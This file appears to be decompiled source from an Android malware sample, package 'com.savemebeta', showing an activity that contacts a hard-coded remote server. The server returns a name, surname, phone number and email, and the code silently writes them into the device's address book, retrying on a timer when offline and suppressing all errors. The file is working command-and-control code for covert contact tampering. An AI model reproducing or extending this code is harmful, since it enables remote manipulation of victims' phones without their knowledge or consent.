package com.savemebeta;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class addcontact extends Activity {
    public static String Email;
    public static String LName;
    public static String Name;
    public static String Tel;
    String[] StatusData;
    Boolean conx = Boolean.valueOf(false);
    Context ctx = this;

    public class StatusTask extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("http://topemarketing.com/android/Final10/acontact.php");
            List<NameValuePair> nameValuePairs = new ArrayList(5);
            nameValuePairs.add(new BasicNameValuePair("mac", ""));
            try {
                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                try {
                    try {
                        StringTokenizer list = new StringTokenizer(EntityUtils.toString(httpclient.execute(httppost).getEntity()), "#");
                        addcontact.this.StatusData = new String[(list.countTokens() - 1)];
                        int i = 0;
                        while (list.hasMoreElements()) {
                            try {
                                addcontact.this.StatusData[i] = list.nextElement().toString();
                                i++;
                            } catch (Exception e) {
                            }
                        }
                    } catch (Exception e2) {
                    }
                } catch (ClientProtocolException e3) {
                    e3.printStackTrace();
                } catch (IOException e4) {
                    e4.printStackTrace();
                }
            } catch (UnsupportedEncodingException e5) {
                e5.printStackTrace();
            }
            addcontact.Name = addcontact.this.StatusData[0];
            addcontact.LName = addcontact.this.StatusData[1];
            addcontact.Tel = addcontact.this.StatusData[2];
            addcontact.Email = addcontact.this.StatusData[3];
            addcontact.this.addContact();
            return null;
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ConnectivityManager con_manager = (ConnectivityManager) this.ctx.getSystemService("connectivity");
        if (con_manager.getActiveNetworkInfo() != null && con_manager.getActiveNetworkInfo().isAvailable() && con_manager.getActiveNetworkInfo().isConnected()) {
            this.conx = Boolean.valueOf(true);
        } else {
            this.conx = Boolean.valueOf(false);
        }
        if (this.conx.booleanValue()) {
            new StatusTask().execute(new Void[0]);
        } else {
            new Timer().schedule(new TimerTask() {
                public void run() {
                    addcontact.this.startService(new Intent(addcontact.this, addcontact.class));
                }
            }, 30000);
        }
    }

    /* access modifiers changed from: private */
    public void addContact() {
        try {
            COOP.Insert2Contacts(getApplicationContext(), Name + " " + LName, Tel);
            if (COOP.isTheNumberExistsinContacts(getApplicationContext(), Tel)) {
                Log.i(COOP.TAG, "Exists");
            } else {
                startService(new Intent(this, restart.class));
            }
        } catch (Exception e) {
        }
        finish();
    }
}
